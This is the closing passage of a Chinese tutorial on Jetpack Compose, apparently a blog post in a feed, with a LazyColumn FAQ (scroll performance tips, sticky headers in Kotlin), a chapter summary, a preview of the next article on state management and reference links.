            .weight(<span class="hljs-number">1f</span>)  <span class="hljs-comment">// 填满剩余空间</span>
    )
    Text(<span class="hljs-string">"Footer"</span>)
}
</code></pre>
<h3 data-id="heading-61">5.3 LazyColumn 相关问题</h3>
<p><strong>Q: 列表滑动卡顿怎么办？</strong></p>
<p>A: 检查以下几点：</p>
<ol>
<li>是否使用了 key</li>
<li>item 中是否避免了创建新对象</li>
<li>是否使用了 derivedStateOf 优化频繁变化的状态</li>
<li>item 的布局是否过于复杂</li>
</ol>
<p><strong>Q: 如何实现粘性 Header？</strong></p>
<p>A: 使用 <code>stickyHeader</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">LazyColumn {
    stickyHeader {
        Text(<span class="hljs-string">"Section A"</span>, modifier = Modifier.background(Color.Gray))
    }
    items(itemsA) { Item(it) }
    
    stickyHeader {
        Text(<span class="hljs-string">"Section B"</span>, modifier = Modifier.background(Color.Gray))
    }
    items(itemsB) { Item(it) }
}
</code></pre>
<hr/>
<h2 data-id="heading-62">六、本篇小结</h2>
<p>今天我们深入探讨了 Compose 的核心基石：</p>
<h3 data-id="heading-63">Modifier</h3>
<ul>
<li>理解了 Modifier 的接口设计和链表结构</li>
<li>掌握了链式调用的执行顺序</li>
<li>学会了自定义 Modifier 的三种方式</li>
<li>了解了 Intrinsic 测量的原理</li>
</ul>
<h3 data-id="heading-64">布局系统</h3>
<ul>
<li>理解了 Composition → Layout → Drawing 的三阶段</li>
<li>掌握了 Constraints 的使用方法</li>
<li>深入了解了 Column、Row、Box 的测量与布局原理</li>
<li>学会了自定义 Layout 的设计思路</li>
</ul>
<h3 data-id="heading-65">LazyColumn</h3>
<ul>
<li>理解了惰性加载的视口渲染机制</li>
<li>掌握了 key 的作用和 diff 算法</li>
<li>学会了列表状态管理和分页加载</li>
<li>了解了性能优化的最佳实践</li>
</ul>
<h3 data-id="heading-66">ConstraintLayout</h3>
<ul>
<li>理解了约束求解的原理</li>
<li>掌握了与嵌套布局的选择策略</li>
</ul>
<hr/>
<h2 data-id="heading-67">下篇预告</h2>
<p><strong>第三篇：状态管理</strong> 将深入讲解：</p>
<ul>
<li>状态与重组机制深度解析（Slot Table 原理）</li>
<li>remember、mutableStateOf 源码分析</li>
<li>状态提升（State Hoisting）设计模式</li>
<li>ViewModel 与 Compose 的最佳实践</li>
<li>CompositionLocal 原理与应用</li>
</ul>
<p>敬请期待！</p>
<hr/>
<h2 data-id="heading-68">参考资源</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fcompose%2Flayouts" target="_blank" title="https://developer.android.com/jetpack/compose/layouts" ref="nofollow noopener noreferrer">Compose 布局官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fcompose%2Flists" target="_blank" title="https://developer.android.com/jetpack/compose/lists" ref="nofollow noopener noreferrer">Lazy 列表官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fframeworks%2Fsupport%2F%2B%2Fandroidx-main%2Fcompose%2F" target="_blank" title="https://android.googlesource.com/platform/frameworks/support/+/androidx-main/compose/" ref="nofollow noopener noreferrer">Compose 源码</a></li>
</ul>
<hr/>
<blockquote>
<p>📌 <strong>系列文章导航</strong></p>
<ul>
<li>第一篇：初识 Compose ✅</li>
<li>第二篇：核心基石（当前）✅</li>
<li>第三篇：状态管理</li>
<li>第四篇：Material 组件与主题</li>
<li>第五篇：动画与交互</li>
<li>第六篇：架构与工程化</li>
<li>第七篇：高级特性与实战</li>
</ul>
</blockquote>
<hr/>
<p>如果这篇文章对你有帮助，欢迎 <strong>点赞</strong>、<strong>收藏</strong>、<strong>关注</strong>！有任何问题可以在评论区留言。</p>
<p><del>Generated by Kimi K2.5 Agent</del></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>